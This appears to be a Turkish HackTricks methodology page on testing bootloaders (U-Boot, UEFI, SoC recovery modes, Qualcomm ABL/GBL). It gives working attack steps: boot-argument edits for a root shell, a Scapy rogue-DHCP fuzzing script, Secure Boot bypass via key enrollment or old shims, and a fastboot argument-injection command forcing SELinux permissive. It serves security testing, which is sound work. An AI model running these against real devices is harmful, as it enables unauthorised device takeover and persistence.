# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

U-Boot ve UEFI sınıfı yükleyiciler gibi bootloader'ları test etmek ve cihaz başlangıç yapılandırmalarını değiştirmek için aşağıdaki adımlar önerilir. Erken aşamada kod yürütme elde etmeye, imza/rollback korumalarını değerlendirmeye ve recovery veya network-boot yollarını kötüye kullanmaya odaklanın.

İlgili: bl2_ext patching ile MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot hızlı kazanımlar ve ortam değişkenlerinin kötüye kullanımı

1. Yorumlayıcı kabuğuna erişin
   - Boot sırasında, `bootcmd` çalışmadan önce U-Boot istemine düşmek için bilinen bir durdurma tuşuna (genellikle herhangi bir tuş, 0, boşluk veya karta özgü bir "magic" dizisi) basın.<sup>[[1]](#references)</sup>

2. Boot durumunu ve değişkenleri inceleyin
   - Yararlı komutlar:
     - `printenv` (ortam değişkenlerini dök)
     - `bdinfo` (kart bilgileri, bellek adresleri)
     - `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
     - `help ext4load; help fatload; help tftpboot` (kullanılabilir yükleyiciler)

3. Root shell almak için boot argümanlarını değiştirin
   - Kernel'ın normal init yerine bir shell'e düşmesi için `init=/bin/sh` ekleyin:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP sunucunuzdan ağ üzerinden önyükleme
   - Ağı yapılandırın ve LAN'dan bir kernel/fit image alın:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Değişiklikleri ortam üzerinden kalıcı hale getirin
   - env depolama yazmaya karşı korumalı değilse kontrolü kalıcı hale getirebilirsiniz:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Fallback yollarını etkileyen `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi değişkenleri kontrol edin. Yanlış yapılandırılmış değerler, shell'e tekrar tekrar erişilmesini sağlayabilir.

6. Debug/güvenli olmayan özellikleri kontrol edin
   - Şunları arayın: `bootdelay` > 0, `autoboot` devre dışı, kısıtlanmamış `usb start; fatload usb 0:1 ...`, seri bağlantı üzerinden `loady`/`loads` çalıştırabilme, güvenilmeyen medyadan `env import` ve imza kontrolleri olmadan yüklenen kernel/ramdisk'ler.

7. U-Boot image/doğrulama testleri
   - Platform, FIT image'larla secure/verified boot kullandığını iddia ediyorsa imzasız ve üzerinde oynanmış image'ları deneyin:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ayarlarının bulunmaması veya eski `verify=n` davranışı, çoğu zaman rastgele payload'ların boot edilmesine olanak tanır.
   - Basit bir izin/verme sonucuyla yetinmeyin: Yakın tarihli FIT araştırmaları, doğrulama yolunun kendisinin de pre-auth attack surface olabileceğini gösterdi. Harici olarak depolanan FIT verilerini (`data-offset`, `data-position`, `data-size`), imzalı yapılandırma seçimini, `loadables`'ı ve overlay / `extra-conf` işlemeyi negatif test edin.
   - Eşleşen bir kaynak ağacınız varsa, gerçek donanıma dokunmadan önce `test/vboot/vboot_test.sh`, U-Boot sandbox'ta FIT doğrulama davranışını yeniden üretmenin hızlı bir yoludur.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` ve script bootflows
   - Modern U-Boot derlemelerinde `bootcmd` çoğu zaman Standard Boot etrafında bir wrapper'dan ibarettir. Bu, görünür ortam zararsız görünse bile yazılabilir medyanın, PXE'nin veya SPI flash'ın gerçek güven sınırı hâline gelebileceği anlamına gelir.
   - `extlinux` bootmeth, `/` ve `/boot` altında `extlinux/extlinux.conf` dosyasını arar; script bootmeth önce `boot.scr.uimg`, ardından `boot.scr` dosyasını arar. Network boot sırasında script dosya adı `boot_script_dhcp` üzerinden gelebilir.
   - Yararlı ilk inceleme komutları:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Test edilecek kötüye kullanım senaryoları: `boot_targets` içinde daha üst sırada yer alan saldırgan denetimindeki USB/SD ortamları, yazılabilir `/boot/extlinux/extlinux.conf`, `boot.scr` sağlayan rogue TFTP sunucusu veya `script_offset_f` üzerinden SPI destekli script yürütme.
   - Platform FIT doğrulamasına dayanıyorsa yapılandırmaların yalnızca görüntü başına değil, yapılandırma düzeyinde de imzalandığından emin olun; `required-mode=all`, gerekli anahtarlardan herhangi birini kabul etmekten daha güçlüdür.

## Ağ önyükleme yüzeyi (DHCP/PXE) ve rogue sunucular

9. PXE/DHCP parametre fuzzing’i
   - U-Boot’un eski BOOTP/DHCP işleme kodunda bellek güvenliği sorunları görüldü. Örneğin CVE‑2024‑42040, U-Boot belleğindeki baytları ağ üzerinden sızdırabilen, özel hazırlanmış DHCP yanıtları aracılığıyla bellek ifşasını açıklar.<sup>[[4]](#references)</sup> DHCP/PXE kod yollarını aşırı uzun veya uç durum değerleriyle (67 numaralı seçenek olan bootfile-name, vendor seçenekleri, file/servername alanları) test edin ve takılma/sızıntı olup olmadığını gözlemleyin.
   - Netboot sırasında önyükleme parametrelerini zorlamak için minimal Scapy snippet’i:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Ayrıca, PXE filename alanlarının OS tarafındaki provisioning script’lerine aktarıldığında sanitization uygulanmadan shell/loader mantığına iletilip iletilmediğini doğrulayın.

10. Rogue DHCP server command injection testi
   - Rogue bir DHCP/PXE service kurun ve boot chain’in sonraki aşamalarında command interpreter’lara ulaşmayı denemek için filename veya options alanlarına karakterler ekleyin. Metasploit’in DHCP auxiliary modülü, `dnsmasq` veya özel Scapy script’leri bu iş için uygundur. Önce lab ağını izole ettiğinizden emin olun.

## Normal boot sürecini geçersiz kılan SoC ROM recovery modları

Birçok SoC, flash image’ları geçersiz olsa bile USB/UART üzerinden kod kabul eden bir BootROM "loader" moduna sahiptir. Secure-boot fuse’ları yakılmamışsa bu, zincirin çok erken bir aşamasında arbitrary code execution sağlayabilir.

- NXP i.MX (Serial Download Mode)
  - Araçlar: `uuu` (mfgtools3) veya `imx-usb-loader`.
  - Örnek: RAM’den özel bir U-Boot yükleyip çalıştırmak için `imx-usb-loader u-boot.imx`.
- Allwinner (FEL)
  - Araç: `sunxi-fel`.
  - Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Araç: `rkdeveloptool`.
  - Örnek: Bir loader aşamalandırmak ve özel bir U-Boot yüklemek için `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`.

Cihazda secure-boot eFuses/OTP yakılıp yakılmadığını değerlendirin. Yakılmamışlarsa BootROM download modları, ilk aşama payload’ınızı doğrudan SRAM/DRAM’den çalıştırarak daha üst düzeydeki doğrulamaları (U-Boot, kernel, rootfs) sıklıkla atlar.

## UEFI/PC sınıfı bootloader’lar: hızlı kontroller

11. ESP tampering, rollback ve key-enrollment testi
   - EFI System Partition’ı (ESP) mount edin ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
   - Mümkünse OS üzerinden Secure Boot durumunu ve key database’lerini döküm alın:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Platform Setup Mode’daysa, kimlik doğrulaması olmadan anahtar kaydını kabul ediyorsa veya test/varsayılan Platform Key (PKfail sınıfı) ile sunuluyorsa, yerel yönetici ya da fiziksel saldırgan kendi KEK/db anahtarlarını kaydedip Secure Boot “enabled” görünürken rastgele EFI binary’lerini başlatabilir.<sup>[[3]](#references)</sup>
   - Secure Boot iptal listeleri (dbx) güncel değilse, sürümü düşürülmüş veya bilinen güvenlik açıklarına sahip imzalı boot bileşenleriyle başlatmayı deneyin. Platform eski shim/bootmanager’lara hâlâ güveniyorsa, kalıcılık sağlamak için genellikle ESP’den kendi kernel’inizi veya `grub.cfg` dosyanızı yükleyebilirsiniz.

12. Eski shim / SBAT / dbx iptal testi
   - Eski Microsoft imzalı shim’ler ve vendor fork’ları, iptal listeleri güncel değilse hâlâ BYOVD tarzı bir bootkit yolu sağlayabilir. İzole bir lab ortamında, ESP’ye geçmişte güvenlik açığı bulunan bir shim yerleştirip kendi `grubx64.efi` dosyanızı veya kernel’inizi chainload etmeyi deneyin.<sup>[[11]](#references)</sup>
   - Hızlı ön değerlendirme:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Shim, revocation list'te olmasına rağmen çalışmaya devam ediyorsa firmware/OS güncel olmayan `dbx` güncellemelerine sahiptir veya upstream SBAT korumalarını hiç devralmamış fork edilmiş bir loader'a güveniyordur.

13. Boot logo ayrıştırma hataları (LogoFAIL sınıfı)
   - DXE'de boot logo'larını işleyen görüntü ayrıştırma kusurları nedeniyle birçok OEM/IBV firmware'i savunmasızdı. Saldırgan ESP'ye satıcıya özgü bir yol altında (ör. `\EFI\<vendor>\logo\*.bmp`) özel hazırlanmış bir görüntü yerleştirip cihazı yeniden başlatabilirse, Secure Boot etkin olsa bile erken boot sırasında kod çalıştırmak mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yolların OS içinden yazılabilir olup olmadığını test edin.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) güven boşlukları

Qualcomm'un ABL'sini kullanarak **Generic Bootloader Library (GBL)** yükleyen Android 16 cihazlarda, ABL'nin `efisp` bölümünden yüklediği UEFI uygulamasının **kimliğini doğrulayıp doğrulamadığını** kontrol edin. ABL yalnızca bir UEFI uygulamasının **varlığını** kontrol ediyor ve imzaları doğrulamıyorsa, `efisp`'e yazma olanağı boot sırasında **OS öncesi imzasız kod çalıştırmaya** imkân verir.<sup>[[6]](#references)[[7]](#references)</sup>

Uygulanabilir kontroller ve istismar yolları:

- **efisp yazma olanağı**: `efisp` içine özel bir UEFI uygulaması yazmanın bir yoluna ihtiyacınız vardır (root/privileged service, OEM app bug, recovery/fastboot path). Bu olmadan GBL yükleme boşluğuna doğrudan erişilemez.<sup>[[6]](#references)</sup>
- **fastboot OEM argüman enjeksiyonu** (ABL bug): Bazı build'ler `fastboot oem set-gpu-preemption` komutunda ek token'ları kabul eder ve bunları kernel cmdline'a ekler. Bu, korumalı bölüm yazmalarına imkân vererek SELinux'u permissive duruma zorlamak için kullanılabilir:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Cihaz patch'liyse komut ek argümanları reddetmelidir.<sup>[[5]](#references)[[6]](#references)</sup>
- **Kalıcı flag'ler aracılığıyla bootloader kilidini açma**: Boot aşamasındaki bir payload, `fastboot oem unlock` komutunu OEM sunucusu/onay koşullarına takılmadan taklit etmek için kalıcı kilit açma flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) değiştirebilir. Bu, sonraki yeniden başlatmadan sonra da kalıcı olan bir durum değişikliğidir.<sup>[[6]](#references)</sup>

Savunma/ilk inceleme notları:

- ABL'nin `efisp` içindeki GBL/UEFI payload'ı için imza doğrulaması yapıp yapmadığını teyit edin. Yapmıyorsa `efisp`'i yüksek riskli bir kalıcılık yüzeyi olarak değerlendirin.
- ABL fastboot OEM işleyicilerinin **argüman sayılarını doğrulayacak** ve ek token'ları reddedecek şekilde patch'lenip patch'lenmediğini takip edin.<sup>[[8]](#references)[[9]](#references)</sup>

## Donanım uyarısı

Erken açılış sırasında SPI/NAND flash ile etkileşimde bulunurken (ör. okumaları atlatmak için pinleri topraklama) dikkatli olun ve her zaman flash veri sayfasına başvurun. Zamanlaması yanlış yapılan kısa devreler cihaza veya programlayıcıya zarar verebilir.

## Notlar ve ek ipuçları

- Ortam blob'larını RAM ile depolama arasında taşımak için `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` komutlarını deneyin; bazı platformlar çıkarılabilir medyadan kimlik doğrulama olmadan env içe aktarılmasına izin verir.
- `extlinux.conf` üzerinden açılan Linux tabanlı sistemlerde, imza denetimi uygulanmıyorsa önyükleme bölümündeki `APPEND` satırını değiştirmek (`init=/bin/sh` veya `rd.break` eklemek için) genellikle yeterlidir.
- Hedef dual-slot / A/B güncellemeleri kullanıyorsa, bootloader dışındaki yalnızca güncelleyiciye özgü güven açığı noktalarını gözden kaçırmamak için [firmware analysis overview](README.md) içindeki anti-rollback ve slot-desync tekniklerini inceleyin.
- Userland `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config` dosyasının gerçek env depolama alanıyla eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD bölgesini okumanıza/yazmanıza neden olabilir.

## References

- [1] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL'i Keşfetmek: Sistem açılışı sırasında görsel ayrıştırmanın tehlikeleri](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Güvenilmeyen Platform Anahtarları, UEFI Ekosisteminde Secure Boot'u Zayıflatıyor](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Ayrıntıları](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Önceden Engellendi: İki temizlenmemiş string aracılığıyla Xiaomi kilidini açma](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit'i saldırganların bootloader kilitlerini açmasına olanak tanıyor](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) mimarisi](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Güvenilmeyen girdinin kernel cmdline'a aktarılmasını düzeltme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value komutu için denetim ekleme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Önyüklemeye uygun değil: U-Boot'un FIT imza doğrulamasını aşmak](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Güvenlik Açığı Notu VU#616257 - Microsoft imzalı UEFI shim bootloader'ları Secure Boot atlatma saldırılarına açık](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
